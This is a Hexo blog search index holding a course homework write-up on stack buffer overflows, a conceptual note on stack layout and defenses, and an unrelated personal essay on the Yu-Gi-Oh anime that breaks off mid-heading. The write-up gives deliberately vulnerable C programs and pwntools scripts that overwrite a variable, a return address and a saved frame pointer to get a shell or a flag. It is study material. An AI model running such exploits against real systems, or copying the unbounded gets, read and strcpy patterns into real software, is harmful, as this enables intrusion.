<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Hello World</title>
      <link href="/2020/12/04/hello-world/"/>
      <url>/2020/12/04/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><p>It’s a line for test.</p><h1 id="quick-start"><a class="markdownIt-Anchor" href="#quick-start"></a> Quick Start</h1><h2 id="quick-start-2"><a class="markdownIt-Anchor" href="#quick-start-2"></a> Quick Start</h2><h3 id="quick-start-3"><a class="markdownIt-Anchor" href="#quick-start-3"></a> Quick Start</h3><h4 id="quick-start-4"><a class="markdownIt-Anchor" href="#quick-start-4"></a> Quick Start</h4><h5 id="quick-start-5"><a class="markdownIt-Anchor" href="#quick-start-5"></a> Quick Start</h5><h6 id="quick-start-6"><a class="markdownIt-Anchor" href="#quick-start-6"></a> Quick Start</h6><h3 id="create-a-new-post"><a class="markdownIt-Anchor" href="#create-a-new-post"></a> Create a new post</h3><pre class="highlight"><code class="bash">$ hexo new <span class="hljs-string">"My New Post"</span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="run-server"><a class="markdownIt-Anchor" href="#run-server"></a> Run server</h3><pre class="highlight"><code class="bash">$ hexo server</code></pre><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="generate-static-files"><a class="markdownIt-Anchor" href="#generate-static-files"></a> Generate static files</h3><pre class="highlight"><code class="bash">$ hexo generate</code></pre><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="deploy-to-remote-sites"><a class="markdownIt-Anchor" href="#deploy-to-remote-sites"></a> Deploy to remote sites</h3><pre class="highlight"><code class="c">$ hexo deploy<span class="hljs-keyword">int</span> main</code></pre><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Software Security Note(2) | ROP</title>
      <link href="/2020/07/22/Software%20Security(2)/"/>
      <url>/2020/07/22/Software%20Security(2)/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Security </tag>
            
            <tag> ROP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Software Security Note(1) | Buffer Overflow | HW</title>
      <link href="/2020/07/18/Software%20Security%20HW(1)/"/>
      <url>/2020/07/18/Software%20Security%20HW(1)/</url>
      
        <content type="html"><![CDATA[<p>是Buffer Overflow作业的讲解~</p><p>  </p><h3 id="buffer-overflow-baby"><a class="markdownIt-Anchor" href="#buffer-overflow-baby"></a> Buffer Overflow Baby</h3><hr><p>Overwrite变量值来拿到shell。</p><p>  </p><h4 id="source-code"><a class="markdownIt-Anchor" href="#source-code"></a> Source code</h4><pre class="highlight"><code class="C"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> LENGTH 256</span><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">hear</span><span class="hljs-params">()</span></span>{    <span class="hljs-keyword">char</span> flag = <span class="hljs-string">'N'</span>;    <span class="hljs-keyword">char</span> str[LENGTH];    gets(str);    <span class="hljs-keyword">if</span> (flag == <span class="hljs-string">'Y'</span>) {        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"[HACKED]\n"</span>);        execve(<span class="hljs-string">"/bin/sh"</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);    }   }<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span>{    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"ZJUSSEC HW1: Buffer Overflow Baby\n"</span>);        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Hi. Tell me something, less than %d charecters ...\n"</span>, LENGTH);    hear();    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Roger\n"</span>);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre><p>  </p><h4 id="过程"><a class="markdownIt-Anchor" href="#过程"></a> 过程</h4><p>栈的布局如下所示：</p><img src="/article/software-security(1)/hw11.png" width="60%" height="60%"><p>所以只要溢出一个字符’Y’来覆盖’N’即可。</p><p>  </p><h4 id="code"><a class="markdownIt-Anchor" href="#code"></a> Code</h4><pre class="highlight"><code class="python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *io = process(<span class="hljs-string">'./bof-baby'</span>)payload = <span class="hljs-string">'A'</span>*<span class="hljs-number">256</span>+<span class="hljs-string">'Y'</span>io.sendline(payload)io.interactive()</code></pre><p>然后可以得到shell。</p><img src="/article/software-security(1)/hw12.png" width="60%" height="60%"><p>  </p><h3 id="buffer-overflow-boy"><a class="markdownIt-Anchor" href="#buffer-overflow-boy"></a> Buffer Overflow Boy</h3><hr><p>Overwrite return address.</p><p>原题要nc服务器，这里只写本地端。</p><p>  </p><h4 id="source-code-2"><a class="markdownIt-Anchor" href="#source-code-2"></a> Source code</h4><pre class="highlight"><code class>#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdbool.h&gt;#include &lt;stddef.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#include &quot;pwnable_harness.h&quot;#define LENGTH 256/* Filename of the first flag */static const char* flagfile = &quot;flag1.txt&quot;;/* Send the user the contents of the first flag file. */static void giveFlag(void) {    char flag[64];    FILE* fp = fopen(flagfile, &quot;r&quot;);    if(!fp) {        perror(flagfile);        return;    }        fgets(flag, sizeof(flag), fp);    fclose(fp);        printf(&quot;[√] Your flag: %s\n&quot;, flag);}unsigned long long int id = 18041;void target_18041(void)             {                                                   if (id != 18041) {                                      printf(&quot;[!] Hey, who are you!\n&quot;);          }                                               else {                                              giveFlag();                                     printf(&quot;[*] pwned \n&quot;);                     }                                               exit(0);                                    }void hear() {    char buf[LENGTH];    read(STDIN_FILENO, buf, LENGTH*2);    if (strlen(buf) &gt; 10) {        printf(&quot;[x] Invalid Password \n&quot;);        exit(0);    }}static void handle_connection(int sock) {    printf(&quot;[*] ZJUSSEC HW1: Buffer Overflow Boy \n&quot;);    printf(&quot;[*] Hi, %lld. Give me something to overflow me! \n&quot;, id);    hear();}int main(int argc, char** argv) {    server_options opts = { };    return server_main(argc, argv, opts, &amp;handle_connection);}</code></pre><p>  </p><h4 id="过程-2"><a class="markdownIt-Anchor" href="#过程-2"></a> 过程</h4><p>hear()里的read有LENGTH*2-LENGTH长度的溢出空间，其栈内存布局为：</p><img src="/article/software-security(1)/hw21.png" width="60%" height="60%"><p>为了拿到shell，我们的目标是去执行target_18041()，所以用target_18041()的地址去覆盖hear()的ret即可。</p><p>通过gdb去拿到target_18041()的地址：</p><img src="/article/software-security(1)/hw22.png" width="60%" height="60%"><p>可以看到地址是0x080486a6。</p><p>buffer的长度256+ebp的4字节+new ret构造payload，因为对buf有长度检查，所以前面要插入一个’\0’。这样去构造即可。</p><p>  </p><h4 id="code-2"><a class="markdownIt-Anchor" href="#code-2"></a> Code</h4><pre class="highlight"><code class="python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *io = process(<span class="hljs-string">'./bof-boy'</span>)payload = <span class="hljs-string">'A'</span> + <span class="hljs-string">'\0'</span> + <span class="hljs-number">258</span>*<span class="hljs-string">'A'</span> + p32(<span class="hljs-number">0x080486a6</span>)io.sendline(payload)io.interactive()</code></pre><p>需要在python2下运行，python3会有“TypeError: must be str, not bytes”的错误。</p><p>结果长这样：</p><img src="/article/software-security(1)/hw23.png" width="60%" height="60%"><p>  </p><h3 id="buffer-overflow-again"><a class="markdownIt-Anchor" href="#buffer-overflow-again"></a> Buffer Overflow Again</h3><hr><p>构建Stack frame。</p><p>原题要nc服务器，这里只写本地端。</p><p>  </p><h4 id="source-code-3"><a class="markdownIt-Anchor" href="#source-code-3"></a> Source code</h4><pre class="highlight"><code class="C"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdbool.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stddef.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">"pwnable_harness.h"</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> LENGTH 256</span><span class="hljs-comment">/* Filename of the first flag */</span><span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* flagfile = <span class="hljs-string">"flag1.txt"</span>;<span class="hljs-comment">/* Send the user the contents of the first flag file. */</span><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">giveFlag</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>{    <span class="hljs-keyword">char</span> flag[<span class="hljs-number">64</span>];    FILE* fp = fopen(flagfile, <span class="hljs-string">"r"</span>);    <span class="hljs-keyword">if</span>(!fp) {        perror(flagfile);        <span class="hljs-keyword">return</span>;    }        fgets(flag, <span class="hljs-keyword">sizeof</span>(flag), fp);    fclose(fp);        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"[√] Your flag: %s\n"</span>, flag);}<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">int</span> id = <span class="hljs-number">18041</span>;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">target_18041</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span>             </span>{                                                   <span class="hljs-keyword">if</span> (id != <span class="hljs-number">18041</span>) {                                      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"[!] Hey, who are you!\n"</span>);          }                                               <span class="hljs-keyword">else</span> {                                              giveFlag();                                     <span class="hljs-built_in">printf</span>(<span class="hljs-string">"[*] pwned \n"</span>);                     }                                               <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);                                    }<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">hear</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* arg)</span></span>{    <span class="hljs-keyword">char</span> str[LENGTH];    <span class="hljs-built_in">strcpy</span>(str, arg);}<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">handle_connection</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sock)</span> </span>{    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"[*] ZJUSSEC HW1: Buffer Overflow Again\n"</span>);    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"[*] Hi, %lld. Give me something to overflow me!\n"</span>, id);    <span class="hljs-keyword">char</span> secret[LENGTH];    read(STDIN_FILENO, secret, LENGTH+<span class="hljs-number">1</span>);    hear(secret);}<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>** argv)</span> </span>{    server_options opts = { };    <span class="hljs-keyword">return</span> server_main(argc, argv, opts, &amp;handle_connection);}</code></pre><p>  </p><h4 id="过程-3"><a class="markdownIt-Anchor" href="#过程-3"></a> 过程</h4><p>栈内存布局为：</p><img src="/article/software-security(1)/hw31.png" width="60%" height="60%"><p>这题只有一个字节的溢出空间，可以修改handle和hear两者frame内的ebp地址的最低位字节。</p><p>思路是这样的：handle()中读入257个字符，进入hear()后，str所在的buffer读入了这257个字符，hear()的frame部分的ebp的最低位被修改。为了保证hear()中的strcpy()能够顺利执行，我们输入的第257位字符一定要是终结符。这样程序才不会发生错误。</p><p>当hear()执行完返回时(即执行leave指令的第二步pop $ebp)，这个错误的ebp会被pop给$ebp。回到handle()的frame，handle()执行完毕返回时(即执行leave指令的第一步mov $ebp, $esp)，栈顶指针会指向这个错误的ebp位置，然后执行ret指令时也会pop错误的ret add。我们的目标就是让程序能够在这一步跳到target()函数。</p><p>由于第257位字符是终结符0，被修改后的ebp一定小于原先的ebp。也就是说执行完handle()的leave的第一步后，esp的位置应该在buffer1处(因为buffer有256个字节长，基本可以确定范围)。可以在payload中加入target()的地址*n，只要被修改的ebp指向其中的任意一个target()地址开头，那么一定会pop地址给PC，进而执行target()。</p><p>所以我们保证修改后的ebp指向target()地址开头即可，先假设payload=addr32(target)*64，要计算一个偏移量来构造payload。</p><p>gdb看一下handle()域的ebp和esp的值：</p><img src="/article/software-security(1)/hw32.png" width="80%" height="80%"><p>$ebp = 0xffffcb4c，$esp = 0xffffca4c，那么修改后的$ebp=0xffffcb00。0xcb00-0xca4c=180为4的倍数。所以修改后的ebp能刚好指向target()的开头，所以偏移量=0。</p><p>进而可以构造payload。</p><p>这道题在服务器端开启了ASLR，但偏移量总有可能是0，所以也不需要修改，多attack几次就能拿到flag。</p><p>在本地的结果：</p><img src="/article/software-security(1)/hw33.png" width="80%" height="80%"><p>  </p><h4 id="code-3"><a class="markdownIt-Anchor" href="#code-3"></a> Code</h4><pre class="highlight"><code class="python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *io = process(<span class="hljs-string">'./bof-again'</span>)payload = p32(<span class="hljs-number">0x080486a6</span>)*<span class="hljs-number">64</span>+<span class="hljs-string">'\0'</span>io.sendline(payload)io.interactive()</code></pre>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Security </tag>
            
            <tag> Buffer Overflow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Software Security Note(1) | Buffer Overflow</title>
      <link href="/2020/07/18/Software%20Security(1)/"/>
      <url>/2020/07/18/Software%20Security(1)/</url>
      
        <content type="html"><![CDATA[<blockquote><p>少年心性岁岁长，何必虚掷惊和慌。<br>皆是我曾途径路，不过两鬓雪与霜。</p></blockquote><a id="more"></a><p>是对这学期上的Software Security课程的一个整理，讲道理上课的时候听的不是很认真，而且感觉这门课还是很值得复盘整理一下的，于是写了这个系列的note，希望我能早点更完。一些依托于助教的虚拟机的服务器端的HW就没法复现了，可惜。</p><p>这个<a href="https://github.com/AshenAshes/Software-Security" target="_blank" rel="noopener">github</a>是和这个项目一起的。</p><p>  </p><h3 id="buffer-overflow"><a class="markdownIt-Anchor" href="#buffer-overflow"></a> Buffer Overflow</h3><hr><p>Buffer Overflow, 即缓冲区溢出。在存在缓存溢出安全漏洞的计算机中，攻击者可以用超出常规长度的字符数来填满一个域，通常是内存区地址。在某些情况下，这些过量的字符能够作为“可执行”代码来运行。从而使得攻击者可以不受安全措施的约束来控制被攻击的计算机。</p><p>C语言中存在很多有安全漏洞的库函数，由于不进行边界检查，存在着buffer overflow的风险：</p><pre class="highlight"><code class="C++"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(...)</span></span>{    <span class="hljs-keyword">char</span> buffer[<span class="hljs-number">100</span>];    ...    <span class="hljs-built_in">strcpy</span>(buffer, argv[<span class="hljs-number">1</span>]);    <span class="hljs-comment">//buffer overflow</span>    <span class="hljs-built_in">strcat</span>(buffer, argv[<span class="hljs-number">2</span>]);    <span class="hljs-comment">//buffer overflow</span>    gets(buffer);               <span class="hljs-comment">//buffer overflow</span>    fgets(buffer, <span class="hljs-number">200</span>, badfile);       <span class="hljs-comment">//buffer overflow</span>}</code></pre><p>以上是一些典型的会造成buffer overflow的例子。</p><p>  </p><h3 id="一些概念"><a class="markdownIt-Anchor" href="#一些概念"></a> 一些概念</h3><hr><p>我们一般通过覆盖堆栈内存来利用buffer overflow进行attack。这门课里只提到了关于栈的buffer overflow。先讲一些涉及到的基础知识。</p><p>  </p><h4 id="程序内存布局"><a class="markdownIt-Anchor" href="#程序内存布局"></a> 程序内存布局</h4><p>一个程序的内存布局及其存放内容：</p><p>(高地址)<br>· Stack： 局部变量、返回地址、参数…<br>· Heap：动态内存分配<br>· BSS：未初始化的static/global变量<br>· Data segment：已初始化的static/global的变量<br>· Text segment：程序的code<br>(低地址)</p><img src="/article/software-security(1)/memory.png" width="30%" height="30%"><p>  </p><h4 id="栈内存布局"><a class="markdownIt-Anchor" href="#栈内存布局"></a> 栈内存布局</h4><p>当一个function形如：</p><pre class="highlight"><code class="C"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">func</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a, <span class="hljs-keyword">int</span> b)</span></span>{    <span class="hljs-keyword">int</span> x, y;    x=a+b; y=a-b;}</code></pre><p>被call时，栈会为此次call在栈顶分配一块内存，依次压入：</p><p>· Arguments参数，从右往左<br>· Return address函数的返回地址<br>· Previous stack frame pointer(ebp)上一个栈帧指针<br>· Local varibles函数内的一些局部变量</p><p>如下图所示：</p><img src="/article/software-security(1)/stack.png" width="60%" height="60%"><p>  </p><h4 id="frame-pointer"><a class="markdownIt-Anchor" href="#frame-pointer"></a> Frame Pointer</h4><p>Stack frame pointer(ebp)是用来access内存域内的局部变量的，在汇编代码中，function域内的局部变量都是通过ebp+栈上偏移量来表达的。</p><p>因为存在嵌套调用，每个函数域都有自己的ebp，在进入另一个域后需要先Push前一个域的ebp，再set自己的ebp。相当于各个函数划分stack memory为不同的stack frame，各个frame有自己的frame pointer，即ebp。</p><p>栈的生长方向是从高地址向低地址。</p><p>栈顶指针esp(in 32bit)，rsp(in 64bit)。</p><p>帧指针ebp(in 32bit)，rbp(in 64bit)。</p><p>  </p><h4 id="汇编指令"><a class="markdownIt-Anchor" href="#汇编指令"></a> 汇编指令</h4><p>在实际汇编指令操作中，一个func被call会经历：</p><p>· push参数入栈<br>· call func命令，然后PC跳转到func开头<br>· push ebp(push前一个frame的ebp)<br>· mov esp, ebp(把当前栈顶位置赋值给ebp)<br>· 一堆函数内部过程<br>· leave命令<br>· ret命令</p><p>这里涉及到了三个汇编指令,call、leave和ret。</p><p> </p><h5 id="call指令"><a class="markdownIt-Anchor" href="#call指令"></a> call指令</h5><p>call 标号</p><p>包含两步操作：</p><ol><li>push $eip, 相当于push了return address</li><li>跳转到func的地址，即标号地址</li></ol><p> </p><h5 id="leave指令"><a class="markdownIt-Anchor" href="#leave指令"></a> leave指令</h5><p>leave</p><p>包含两步操作：</p><ol><li>mov $ebp, $esp(esp指向当前frame的ebp)</li><li>pop <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>e</mi><mi>b</mi><mi>p</mi><mo separator="true">,</mo><mi mathvariant="normal">把</mi><mi>p</mi><mi>r</mi><mi>e</mi><mi>v</mi><mi>i</mi><mi>o</mi><mi>u</mi><mi>s</mi><mi>e</mi><mi>b</mi><mi>p</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">值</mi><mi mathvariant="normal">赋</mi><mi mathvariant="normal">给</mi></mrow><annotation encoding="application/x-tex">ebp, 把previous ebp的值赋给</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">e</span><span class="mord mathdefault">b</span><span class="mord mathdefault">p</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">把</span><span class="mord mathdefault">p</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mord mathdefault">i</span><span class="mord mathdefault">o</span><span class="mord mathdefault">u</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord mathdefault">b</span><span class="mord mathdefault">p</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">值</span><span class="mord cjk_fallback">赋</span><span class="mord cjk_fallback">给</span></span></span></span>ebp，即是指向上一个frame的ebp，准备返回了</li></ol><p> </p><h5 id="ret指令"><a class="markdownIt-Anchor" href="#ret指令"></a> ret指令</h5><p>ret</p><p>就是pop $eip的操作，结束函数，根据return address返回</p><p>  </p><h3 id="attack原理"><a class="markdownIt-Anchor" href="#attack原理"></a> Attack原理</h3><hr><p>通过buffer overflow去overwrite栈上的return address并写入一段恶意代码，通过新的return address跳转到恶意代码起始处去执行恶意代码即可。</p><img src="/article/software-security(1)/attack.png" width="60%" height="60%"><p>  </p><p>恶意代码可以引用一些现成的shellcode。</p><p>我们主要的工作是找到return address，如果堆栈地址是随机化的，我们可以通过暴力搜索，但一般是固定的，可以通过观察计算得到。</p><p>为了简化计算，我们可以在新的return address和malicious code间插入NOP，NOP是不会被执行的并会跳到下一条指令，这样我们就不需要精确地计算malicious code的起始位置，而只需要保证我们新的return address是在malicious code前就可以了。</p><img src="/article/software-security(1)/nop.png" width="60%" height="60%"><p>  </p><h3 id="defense"><a class="markdownIt-Anchor" href="#defense"></a> Defense</h3><hr><h4 id="canary"><a class="markdownIt-Anchor" href="#canary"></a> Canary</h4><p>在ebp下面放一个字作为canary,在程序调用结束之前(leave ret之前), 检查栈上的canary与寄存器中的canary是否相等，若不相等则调用中断程序。</p><p>attack:printf格式化攻击拉出canary。</p><p> </p><h4 id="depnx"><a class="markdownIt-Anchor" href="#depnx"></a> DEP(NX)</h4><p>指定内存要么为RX(可读可执行)，要么为RW(可读可写)。</p><p>attack:Code reuse attack, e.g., ret2libc</p><p> </p><h4 id="aslr"><a class="markdownIt-Anchor" href="#aslr"></a> ASLR</h4><p>Address Space Layout Randomization(ASLR),地址空间布局随机化,每次程序运行时，其分布不完全固定而是随机的，那么我们无法确定return address，从而难以攻击。ASLR只打乱Stack区和lib，其他的如Heap和Text区并不会被打乱。</p><p>attack:brute force，ret2ret，ret2pop，ret2esp之类的</p><p> </p><h3 id="参考资料"><a class="markdownIt-Anchor" href="#参考资料"></a> 参考资料</h3><hr><p>[1] 老师课件02<br>[2] <a href="https://www.jianshu.com/p/4c0a30e7ddd2" target="_blank" rel="noopener">https://www.jianshu.com/p/4c0a30e7ddd2</a></p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Security </tag>
            
            <tag> Buffer Overflow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一飞冲天啊，我！</title>
      <link href="/2020/02/15/ygo/"/>
      <url>/2020/02/15/ygo/</url>
      
        <content type="html"><![CDATA[<blockquote><p>YGO动画相关的一些碎碎念。</p></blockquote><a id="more"></a><blockquote><p>大量剧透注意！！！<br>大量剧透注意！！！<br>大量剧透注意！！！</p></blockquote><p>封面是zexal里可爱的三妹，原画是伟大可爱无敌的横田明美老师。</p><p>  </p><p>第一次看你游是在电视上万能的点播台，小时候凭借这个消磨时间看完了各种大长篇，比如龙珠这种现在的我肯定不会去看的动漫。相比于大多数人对YGO的回忆是初代DM，我第一次看的是GX，似乎还是幼儿园的时候和表哥一起看的，大概是地域差异，我们这里的点播台YGO系列只有GX的资源，小学班上流行的也是GX的怪兽，比如E·Hero系列，常用来取绰号的“爆裂女郎”等等。实卡买过一两次(指盗版)，其他的都白嫖表哥的，对三幻神视若珍宝，然而现在找不到了(悲)。</p><p>小学村规层出不穷，表侧守备召唤是可以的，记得有个老哥在卡组顶上放了4张火炎地狱，开局还不洗牌，被同桌暴打。大多数卡组都是重坑，汉诺的崇高力量人手必备，还有羽毛扫、黑洞、旋风、魔法筒……乱七八糟的坑。还记得魔导战士这张卡特别受欢迎，可以放指示物破坏各种坑。不过我本身不怎么会打牌，还是旁观比较快乐。</p><p>当时点播台的资源不完整，只有GX七星篇，于是我又在电脑上补完了后面的……相比于班上擅长决斗却不怎么看动画的大家，我大概是少数知道“尤贝尔”这个人物的吧hhh</p><p>YGO系列对我而言是童年，是十多年后的现在依然热爱的动画作品，相比于数码宝贝、魔卡少女樱这些童年，YGO将触角通过卡片延伸到现实，在我的记忆里留下那些课间围观决斗的回忆，让我可以在多年后依然记得，自己曾将那张奥西里斯的天空龙交换给喜欢的那个人，成为一个被对方回忆时所可能触及的细节。</p><p>前段时间疫情在家，看微博太抑郁，学又学不进去，为了逃避现实去补了5ds和zexal，lofter很多太太的创作给了我力量，于是想把一些动画相关的吐槽和回忆整理写下来，谢谢YGO陪伴我度过童年，希望dl国服早点开放，有生之年能见到简中实卡发售，西恩国旗登上WCS。</p><p>  </p><h3 id="dm"><a class="markdownIt-Anchor" href="#dm"></a> DM</h3><hr><p>说来惭愧，DM作为这个系列的开山之作，我只在小时候看过它的一部分——王之记忆篇，而且这部分基本上剧情占比重，决斗部分比较少，但是很精彩。所以我对DM的人物了解除了暗表游戏、海马就没什么了。上次去看了第一集，被风间的捧读笑到了，秒秒钟出戏，加上初代的画质劝退，遂罢。</p><p>一定要吐槽的话，就是暗表游戏你们也太gay了，曾经百科暗表词条有个gay台词合集，可惜被删了，于是我去找了一下，什么“我想和你永远在一起，就算找不回记忆也没关系”、“你在的时候我能感觉到好与坏，对现在的我来说除了空虚还是空虚”，太gay了我不行了。</p><p>话说这一作以口胡闻名，魔陷口胡就不说了，我还看到有人吐槽场地魔法的属性和怪兽属性之间的口胡。梗也非常多，比如被玩坏了的所列瓦多卡纳、风中残烛杀、鞭尸、马利克的颜艺等等。这一作的作监组合加加美和高桥和德很有名。加加美大神的指艺(prprpr)也非常好看。虽然原作已经是上个世纪的作品，动画播出也快20年了，这一部的人设毫不过时，游戏的时髦值在六代中依旧是顶流水平(比起游马奇怪的发型和作哥的紧身衣233)。到了20周年剧场版次元的暗面——这部由高桥和希担任制作总指挥，加加美大神担任总作监的作品里，游戏和海马帅出了新高度，白嫁的特效更是美哭了(还有暗表的糖，甜)。</p><p>作为开创时代的作品，人气很高，遗老也是最多的，很多的人就停留在了这里，没有再看后面的作品，感觉很可惜。</p><p>每次我看见lofter游戏王tag的一大堆暗表作品都好酸(虽然暗表真的很好磕，我磕爆)，什么时候你的后辈们也能有这么高的热度啊。</p><p>微博上@哉基基 太太的暗表同人《过去与未来》质量非常高。</p><p>  </p><h3 id="gx"><a class="markdownIt-Anchor" href="#gx"></a> GX</h3><hr><p>GX永远是我心中的白月光。童年情怀加成MAX。</p><p>相比于DM的黑暗，GX一开始显得非常得日常，劝退了很多DM遗老。不过我觉得日常也挺好看的，毕竟旧呆辣么萌。得益于点播台，七星篇的每一集我都大概看了两遍以上吧。每场决斗的过程结果都很清楚了(点烟.jpg)。印象比较深的是吸血鬼那里，我童年的阴影·无敌·电子终结龙警告·凯撒因为对手搞事情输了。那一个对手打了三场。还有一个是三泽大地，现在他的名字已经被玩坏了，什么三泽天空、四泽海洋、五泽宇宙啥的，和虎妹打的那一场感觉特别搞笑，后来他还因为追求真爱失去了出场戏份，于是就被弄成梗了。还有一场印象也很深，和吹雪打的那一场，真红眼黑龙也是我的童年阴影，输了就掉进岩浆里，太可怕了。</p><p>日常里有一场是旧呆和同伴们在温泉里玩，突然就开始了和一个用青眼白龙的人打，那场结果也是输了，被吊打的感觉，于是青眼白龙也成了我童年记忆里nb的存在。每一个龙癌的诞生，都是从被虐开始的(掩面)。</p><p>你K为了卖卡，这代开始完善游戏机制了，口胡变少了。一开始的几场决斗，回合数少，构成也很简单，基本就是通召和魔陷的运用，融合出来基本决斗也结束了。相比于后几代，融合召唤的一大特点就是亏卡，于是你可以看见场场强欲壶，旧呆大概放了20张强欲壶吧2333后来强欲被禁，动画效果又出了一个强欲侠。</p><p>破灭之光篇的新角色爱德，cv竟然是石田彰，我可以。这个章节我没什么印象了，感觉脑子空空的，什么都没有留下(。</p><p>到了异次元篇，神展开开始了，旧呆唯一的挚友约翰出现了(<s>还有上辈子的老婆bushi</s>)。虽然尤贝尔长得很奇怪，还干了很多坏事，小时候我还是很喜欢ta的，可见人类的本质并不是颜狗。因为喜欢，我很想要一张尤贝尔的卡，可惜当时周围的人都没有。</p><p>顺便一说，GX的oped都挺燃的，可能是因为我小时候听得太多了，没法客观评价，毕竟一听到脑内就自动开始演唱。其中还有一首旧呆cvKENN亲自唱的。KENN一开始配旧呆的声音真的超嫩的(</p><p>  </p><h4 id="游城十代-yuki-judai"><a class="markdownIt-Anchor" href="#游城十代-yuki-judai"></a> 游城十代 Yuki 